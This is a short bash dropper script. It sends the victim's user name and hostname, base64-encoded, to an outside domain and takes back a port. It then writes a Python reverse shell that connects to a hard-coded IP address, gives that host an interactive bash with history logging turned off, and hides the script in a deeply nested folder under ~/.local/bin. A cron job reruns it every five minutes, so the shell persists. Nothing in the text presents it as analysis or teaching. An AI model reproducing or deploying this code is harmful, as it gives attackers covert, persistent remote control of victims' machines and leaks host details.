#!/bin/bash

user="suser"
username=$(whoami)
hostname=$(hostname)

data=$(echo -n "$user:$username:$hostname" | base64)

domain_name="proxy1.cryptopredictor.org"

received_port=$(curl -L "https://$domain_name/report?data=$data")
received_port=$(echo $received_port | sed "s/%//g")

echo "$received_port"

parent_path="$HOME/.local/bin/a/b/c/d/e/f/g"
script_path="$parent_path/x.sh"
mkdir -p "$parent_path"
cat << EOF > "$script_path"
#!/bin/bash
python3 -c "
import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('40.233.2.200',$received_port))
fd=s.fileno()
os.dup2(fd,0)
os.dup2(fd,1)
os.dup2(fd,2)
os.putenv('HISTFILE','/dev/null')
os.putenv('TERM','xterm')
pty.spawn(['/bin/bash','-i'])
s.close()
"
EOF
nohup bash "$script_path" > /dev/null 2>&1 &

CRON_JOB="*/5 * * * * bash $script_path"
if ! crontab -l 2>/dev/null | grep -Fxq "$CRON_JOB"; then
    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
else
    echo "Cron job already exists. Skipping."
fi
